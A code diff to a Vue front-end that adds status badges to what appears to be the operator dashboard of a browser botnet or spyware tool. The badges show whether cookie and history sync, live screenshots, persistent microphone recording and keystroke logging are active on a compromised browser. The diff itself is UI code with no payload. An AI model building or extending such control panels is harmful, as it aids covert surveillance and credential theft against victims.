@@ -61,6 +61,18 @@ async function refresh(): Promise<void> {
 
 const imageURL = computed(() => botsApi.imageURL(props.id))
 
+const statusIndicators = computed(() => {
+  const sc = bot.value?.switch_config ?? {}
+  return [
+    { key: 'SYNC', icon: '⟳', label: 'Tabs', help: 'Real-time tab sync', active: Boolean(sc.SYNC) },
+    { key: 'SYNC_HUGE', icon: '⇄', label: 'Data sync', help: 'History/cookies/bookmarks sync', active: Boolean(sc.SYNC_HUGE) },
+    { key: 'REALTIME_IMG', icon: '📷', label: 'Screen', help: 'Live screenshot capture', active: Boolean(sc.REALTIME_IMG) },
+    { key: 'NOTIFICATION', icon: '🔔', label: 'Alerts', help: 'Domain visit notifications', active: Boolean(sc.NOTIFICATION) },
+    { key: 'PERSISTENT_RECORDING', icon: '🎙', label: 'Mic', help: 'Persistent audio recording', active: Boolean(sc.PERSISTENT_RECORDING) },
+    { key: 'PERSISTENT_KEYBOARD', icon: '⌨', label: 'Keys', help: 'Persistent keystroke logging', active: Boolean(sc.PERSISTENT_KEYBOARD) },
+  ]
+})
+
 watch(() => props.id, refresh, { immediate: true })
 
 onMounted(() => {
@@ -125,6 +137,21 @@ function back(): void {
             {{ bot.current_tab.title || bot.current_tab.url }}
           </a>
           <p v-else class="text-[12px] text-fg-faint mt-1">No active tab.</p>
+
+          <div class="flex flex-wrap gap-1.5 mt-3">
+            <span
+              v-for="s in statusIndicators"
+              :key="s.key"
+              class="inline-flex items-center gap-1.5 px-2 py-0.5 rounded-full text-[10px] font-medium border"
+              :class="s.active
+                ? 'bg-success/10 text-success border-success/25'
+                : 'bg-bg-base text-fg-faint border-border-subtle'"
+              :title="s.help"
+            >
+              <span class="text-[11px]">{{ s.icon }}</span>
+              {{ s.label }}
+            </span>
+          </div>
 
           <dl class="grid grid-cols-2 gap-x-6 gap-y-1.5 text-[11px] mt-4">
             <div>
